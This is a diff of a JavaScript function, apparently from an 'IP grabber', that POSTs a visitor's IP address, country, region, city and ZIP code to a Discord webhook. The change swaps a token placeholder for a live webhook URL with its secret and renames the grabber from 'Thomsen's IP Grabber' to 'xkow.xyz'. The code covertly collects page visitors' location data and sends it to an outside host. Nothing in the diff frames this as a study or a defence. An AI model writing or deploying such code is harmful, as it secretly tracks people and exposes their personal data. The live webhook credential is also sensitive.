@@ -1,19 +1,18 @@
-
 function monke(json) 
 {
      var request = new XMLHttpRequest();
      
-     request.open("POST", "Add You Token Here");
+     request.open("POST", "https://discord.com/api/webhooks/1215325946916110448/ctrRltnGZCH1MkkjjqvEJi8manPP27nDzukmzzxpM-JQqevHHao2ElnX8BGrKGvayH7s");
 
      request.setRequestHeader('Content-type', 'application/json');
 
      var params = 
      {
-          username: "Thomsen's IP Grabber",
-          avatar_url: "https://cdn.discordapp.com/attachments/1122977732385579030/1159803884257149039/ab024efe2306f15b6a2c50a18732c407.png?ex=65325a8a&is=651fe58a&hm=0da8d1f5655d1a075f040c338cad6abdb134953d5424c53389d0bd713092d23c&",
+          username: "xkow.xyz",
+          avatar_url: "https://i.imgur.com/g5NT9x1.png",
           embeds: [
                {
-                    title: "Thomsen's IP Grabber",
+                    title: "xkow.xyz",
                     color: 15000,
                     description: "**IP:** `" + json.ip + "`\n**Country:** `" + json.country + "`\n**Region:** `" + json.region + "`\n**Town/City:** `" + json.city + "`\n**ZIP:** `" + json.postal + "`"
                }
